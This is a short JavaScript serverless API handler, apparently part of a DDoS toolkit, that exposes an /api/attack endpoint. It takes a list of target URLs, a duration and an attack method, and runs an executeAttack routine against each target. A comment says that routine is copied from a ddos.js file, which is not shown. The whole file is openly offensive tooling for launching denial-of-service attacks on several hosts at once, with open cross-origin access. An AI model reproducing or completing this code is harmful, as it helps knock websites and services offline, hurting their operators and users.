// Multi-Target Orchestrator
// Endpoint: /api/attack?targets=url1,url2,url3&duration=30&method=mixed

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    const { targets, duration = 30, method = 'mixed' } = req.query;
    
    if (!targets) {
        return res.status(400).json({ error: 'Targets required (comma separated)' });
    }

    const targetList = targets.split(',');
    const results = {};

    for (const target of targetList) {
        const attackResult = await executeAttack(target.trim(), parseInt(duration), method);
        results[target] = attackResult;
    }

    return res.status(200).json({
        status: 'Multi-target attack completed',
        targets: targetList,
        duration,
        results
    });
}

// Copy executeAttack function from ddos.js or import
// (Untuk menghindari duplikasi, gunakan module import di production)
